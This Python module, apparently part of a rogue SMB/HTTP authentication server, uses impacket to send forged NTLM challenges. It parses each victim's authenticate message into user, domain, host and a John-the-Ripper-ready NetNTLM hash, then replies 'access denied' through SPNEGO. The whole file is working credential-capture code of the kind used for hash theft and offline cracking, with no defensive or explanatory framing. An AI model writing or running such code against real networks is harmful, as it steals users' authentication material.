import calendar, os, struct, time
from impacket import ntlm

def challenge_message(server: str, domain: str, challenge: bytes) -> bytes:
    flags = (ntlm.NTLMSSP_NEGOTIATE_UNICODE | ntlm.NTLMSSP_NEGOTIATE_VERSION | ntlm.NTLMSSP_NEGOTIATE_TARGET_INFO
             | ntlm.NTLMSSP_TARGET_TYPE_SERVER | ntlm.NTLMSSP_NEGOTIATE_NTLM | ntlm.NTLMSSP_REQUEST_TARGET
             | ntlm.NTLMSSP_NEGOTIATE_SIGN | ntlm.NTLMSSP_NEGOTIATE_ALWAYS_SIGN | ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY)
    av = ntlm.AV_PAIRS()
    av[ntlm.NTLMSSP_AV_DOMAINNAME] = domain.upper().encode("utf-16le")
    av[ntlm.NTLMSSP_AV_HOSTNAME] = av[ntlm.NTLMSSP_AV_DNS_HOSTNAME] = server.upper().encode("utf-16le")
    av[ntlm.NTLMSSP_AV_DNS_DOMAINNAME] = domain.upper().encode("utf-16le")
    av[ntlm.NTLMSSP_AV_TIME] = struct.pack("<q", 116444736000000000 + calendar.timegm(time.gmtime()) * 10000000)
    m = ntlm.NTLMAuthChallenge()
    m["flags"] = flags
    dom = domain.encode("utf-16le")
    m["domain_len"] = m["domain_max_len"] = len(dom); m["domain_offset"] = 40 + 16
    m["challenge"] = challenge; m["domain_name"] = dom
    m["TargetInfoFields_len"] = m["TargetInfoFields_max_len"] = len(av)
    m["TargetInfoFields"] = av; m["TargetInfoFields_offset"] = 40 + 16 + len(dom)
    m["Version"] = b"\x0a\x00\x63\x45\x00\x00\x00\x0f"; m["VersionLen"] = 8
    return m.getData()

def parse_authenticate(blob: bytes, challenge: bytes) -> dict:
    a = ntlm.NTLMAuthChallengeResponse(); a.fromString(blob)
    user = a["user_name"].decode("utf-16le"); domain = a["domain_name"].decode("utf-16le")
    from impacket.smbserver import outputToJohnFormat
    h = outputToJohnFormat(challenge, a["user_name"], a["domain_name"], a["lanman"], a["ntlm"])
    return {"user": user, "domain": domain, "host": a["host_name"].decode("utf-16le"), "hash": h["hash_string"]}

def find_ntlmssp(data: bytes) -> bytes | None:
    i = data.find(b"NTLMSSP\x00")
    return data[i:] if i >= 0 else None

def ntlm_type(blob: bytes) -> int:
    return struct.unpack("<I", blob[8:12])[0]

def spnego_challenge(challenge_blob: bytes) -> bytes:
    from impacket.spnego import SPNEGO_NegTokenResp, TypesMech
    t = SPNEGO_NegTokenResp(); t["NegState"] = b"\x01"
    t["SupportedMech"] = TypesMech["NTLMSSP - Microsoft NTLM Security Support Provider"]; t["ResponseToken"] = challenge_blob
    return t.getData()

def spnego_accept_denied() -> bytes:
    from impacket.spnego import SPNEGO_NegTokenResp
    t = SPNEGO_NegTokenResp(); t["NegState"] = b"\x02"; return t.getData()
